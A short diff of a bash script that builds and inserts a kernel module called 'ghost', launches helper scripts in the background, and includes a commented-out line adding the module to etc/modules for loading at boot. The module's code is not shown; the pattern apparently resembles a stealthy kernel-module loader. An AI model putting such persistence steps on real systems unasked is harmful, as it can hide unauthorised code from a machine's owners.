@@ -1,7 +1,7 @@
 #/bin/bash
 
 cd ghost
-make all
+make
 insmod ghost.ko
 # echo -ne "#<ghost>\nghost\n#<ghost>" >> etc/modules
 cd ..
@@ -10,8 +10,8 @@ chmod +x dispose.sh
 chmod +x run.sh
 nohup ./run.sh &
 echo -e "\n\n"
-chmod 764 monitor.sh
-nohup monitor.sh >/dev/null 2>&1 &
+chmod +x monitor.sh
+bash monitor.sh
 
 
 
